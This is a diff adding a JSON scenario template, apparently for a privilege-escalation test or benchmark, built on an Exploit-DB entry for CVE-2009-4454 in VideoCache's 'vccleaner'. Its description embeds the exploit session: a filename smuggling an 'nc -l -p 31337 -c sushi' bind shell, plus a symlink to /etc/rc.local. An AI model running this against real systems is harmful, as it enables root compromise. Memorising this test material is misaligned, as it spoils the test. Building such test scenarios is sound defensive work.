@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_10487",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: VideoCache 1.9.2 - 'vccleaner' Local Privilege Escalation (CVE-2009-4454;OSVDB-61170)\n\nExploit source code (10487.txt):\n```\n====[ SYNOPSIS ]=====================================================\n\nVideoCache is a Squid URL rewriter plugin written in Python for\nbandwidth optimization while browsing video sharing websites.  Version\n1.9.2 allows a user with the privileges of the Squid proxy server to\nappend semi-arbitrary data to arbitrary files with root privileges, upon\nthe administrator's execution of the 'vccleaner' utility.\n\n\n====[ DISCUSSION ]===================================================\n\nVideoCache's 'vccleaner' utility is intended to be executed with root\npermissions periodically, to remove expired videos from the cache.\n(The utility will refuse to execute without root permissions.)\nUpon execution, it looks for old files under the cache directory\n/var/spool/videocache (writable by the Squid proxy user) and deletes\nthem.  Each deleted filename is logged to vccleaner.log, located in\n/var/log/videocache (directory writable by the Squid proxy user).\n\n\n====[ EXPLOIT ]======================================================\n\n.........................attacker.........................\n$ id\nuid=13(proxy) gid=13(proxy) groups=13(proxy)\n$ cd /var/log/videocache\n$ touch -d 19700101 \"/var/spool/videocache/youtube/money\n\n    nc -l -p 31337 -c sushi\n    monkey\"\n\n$ rm -f vccleaner.log\n$ ln -s /etc/rc.local vccleaner.log\n\n.........................admin.........................\n# id\nuid=0(root) gid=0(root) groups=0(root)\n# vccleaner\nVideocache cleaning has completed successfully.\n\n.........................postmortem.........................\n$ cat /etc/rc.local\n2009-12-16 06:56:29,403 INFO START Starting Videocache Cleaner.\n2009-12-16 06:56:29,403 INFO DELETE /var/spool/videocache/youtube/money\nnc -l -p 31337 -c sushi\nmonkey Older than 14594 day(s) was deleted.\n2009-12-16 06:56:29,404 INFO STOP Stopping Videocache Cleaner.\n\n\n====[ SHOUT OUTS ]===================================================\n\nTim, Ben, my buddies at GS, Alien Time Agent, and big man O.\n```",
+  "cve": "CVE-2009-4454;OSVDB-61170",
+  "exploitdb_id": "10487",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_10487",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
